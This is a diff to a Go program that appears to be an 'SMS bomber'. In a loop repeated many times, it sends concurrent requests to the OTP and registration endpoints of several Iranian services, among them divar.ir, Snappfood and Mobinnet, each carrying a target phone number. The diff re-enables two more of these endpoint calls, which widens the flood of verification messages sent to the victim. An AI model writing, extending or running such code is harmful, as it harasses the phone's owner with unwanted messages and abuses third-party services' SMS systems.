@@ -183,7 +183,6 @@ func main() {
 
 	// Loop to send requests concurrently
 	for i := 0; i < repeatCount; i++ {
-		// --- Start of new API calls ---
 
 		// divar.ir (JSON)
 		wg.Add(1)
@@ -430,22 +429,19 @@ func main() {
 			"cellphone": phone,
 		}, &wg, ch)
 
-
-		// --- End of new API calls ---
-
 		// Original Snappfood form request (kept for reference/comparison)
-		// wg.Add(1)
-		// go func(p string) {
-		// 	formData := url.Values{}
-		// 	formData.Set("cellphone", p)
-		// 	sendFormRequest(ctx, "https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass?lat=35.774&long=51.418", formData, &wg, ch)
-		// }(phone)
+		 wg.Add(1)
+		 go func(p string) {
+		 	formData := url.Values{}
+		 	formData.Set("cellphone", p)
+		 	sendFormRequest(ctx, "https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass?lat=35.774&long=51.418", formData, &wg, ch)
+		 }(phone)
 
 		// Original Mobinnet JSON request (kept for reference/comparison)
-		// wg.Add(1)
-		// go func(p string) {
-		// 	sendJSONRequest(ctx, "https://my.mobinnet.ir/api/account/SendRegisterVerificationCode", map[string]interface{}{"cellNumber": p}, &wg, ch)
-		// }(phone)
+		 wg.Add(1)
+		 go func(p string) {
+		 	sendJSONRequest(ctx, "https://my.mobinnet.ir/api/account/SendRegisterVerificationCode", map[string]interface{}{"cellNumber": p}, &wg, ch)
+		 }(phone)
 	}
 
 	// Goroutine to wait for all requests to complete and then close the channel.
